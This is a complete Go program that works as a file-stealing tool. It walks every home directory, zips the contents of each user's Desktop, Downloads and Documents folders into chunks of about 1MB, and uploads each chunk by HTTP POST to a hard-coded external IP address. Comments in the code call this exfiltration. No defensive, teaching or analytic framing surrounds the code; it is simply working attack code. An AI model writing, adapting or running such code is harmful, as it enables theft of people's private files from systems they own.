package main

import (
	"archive/zip"
	"bytes"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"

	"github.com/fatih/color"
)

var targetFiles []string

const (
	TARGET_DIRECTORY       = "/home/"
	SERVER_URL             = "http://14.121.11.99:80/uploads"
	MAX_ZIP_SIZE     int64 = 1024 * 1024
)

func main() {
	// Compile list of target directories to zip
	log.Printf("Searching target directory %s.\n", TARGET_DIRECTORY)
	getTargetFiles()

	// Zip Desktop, Downloads, Documents 1MB each
	log.Printf("Zipping target files.\n")
	zippedDirs := zipTargetDirs()

	// Exfil via HTTP
	log.Printf("Uploading zip files to %s.\n", SERVER_URL)
	exfilZips(zippedDirs)
}

// getTargetFiles(): enumerates the folders & files in the TARGET_DIRECTORY and compiles a list of files to zip
func getTargetFiles() {
	entries, err := os.ReadDir(TARGET_DIRECTORY)
	if err != nil {
		log.Fatal(err)
	}

	for _, e := range entries {
		if e.IsDir() {
			subentries, err := os.ReadDir(TARGET_DIRECTORY + e.Name())
			if err != nil {
				logError("Error reading directory", TARGET_DIRECTORY+e.Name())
			} else {
				for _, f := range subentries {
					if (f.Name() == "Desktop") || (f.Name() == "Downloads") || (f.Name() == "Documents") {
						path := TARGET_DIRECTORY + e.Name() + "/" + f.Name()
						log.Printf("Found valid target directory: %s\n", path)
						addFiles(path)
					}
				}
			}
		}
	}
}

// zipTargetDirs(): zips the target directories in 1MB chunks
func zipTargetDirs() []string {
	archiveNum := 0
	var zippedDirs []string
	var currentZipSize int64 = 0

	zipName := "archive" + strconv.Itoa(archiveNum)
	zipFile, err := os.Create(zipName)
	if err != nil {
		log.Fatal(err)
	}
	w := zip.NewWriter(zipFile)

	for _, filePath := range targetFiles {
		fileToZip, err := os.Open(filePath)
		if err != nil {
			logError(err)
			continue
		}

		fileInfo, err := fileToZip.Stat()
		if err != nil {
			logError(err)
			continue
		}

		if currentZipSize+fileInfo.Size() > MAX_ZIP_SIZE {
			w.Close()
			zipFile.Close()
			archiveNum += 1
			currentZipSize = 0
			zippedDirs = append(zippedDirs, zipName)
			logSuccess("Created zip file", zipName)

			// Create new zip file & writer
			zipName = "archive" + strconv.Itoa(archiveNum)
			zipFile, err = os.Create(zipName)
			if err != nil {
				log.Fatal(err)
			}
			w = zip.NewWriter(zipFile)
		}

		f, err := w.Create(fileToZip.Name())
		if err != nil {
			logError(err)
			continue
		}

		_, err = io.Copy(f, fileToZip)
		if err != nil {
			logError(err)
			continue
		}

		currentZipSize += fileInfo.Size()
	}

	w.Close()
	zipFile.Close()
	zippedDirs = append(zippedDirs, zipName)
	logSuccess("Created zip file", zipName)

	return zippedDirs
}

// addFiles(): recursively iterates through a directory and adds files to the targetFiles array
func addFiles(path string) {
	files, err := os.ReadDir(path)
	if err != nil {
		logError("Error reading target directory", path)
		return
	}
	for _, file := range files {
		filePath := path + "/" + file.Name()
		if file.IsDir() {
			addFiles(filePath)
		} else {
			targetFiles = append(targetFiles, filePath)
		}
	}
}

// exfilZips(): exfiltrate the zipped files via HTTP to the SERVER_URL
func exfilZips(zippedDirs []string) {
	for _, zippedFile := range zippedDirs {
		postBody, err := os.ReadFile(zippedFile)
		if err != nil {
			logError(err)
			continue
		}
		request, err := http.NewRequest("POST", SERVER_URL, bytes.NewBuffer(postBody))
		if err != nil {
			logError(err)
			continue
		}
		request.Header.Set("filename", zippedFile)

		client := &http.Client{}
		response, err := client.Do(request)
		if err != nil {
			logError(err)
			continue
		}

		if response.StatusCode != 200 {
			logError("Failed to upload", zippedFile)
			continue
		}
		response.Body.Close()
		logSuccess("Uploaded", zippedFile)
	}
}

func logError(a ...interface{}) {
	color.Set(color.FgRed)
	defer color.Unset()
	log.Println(a...)
}

func logSuccess(a ...interface{}) {
	color.Set(color.FgHiGreen)
	defer color.Unset()
	log.Println(a...)
}
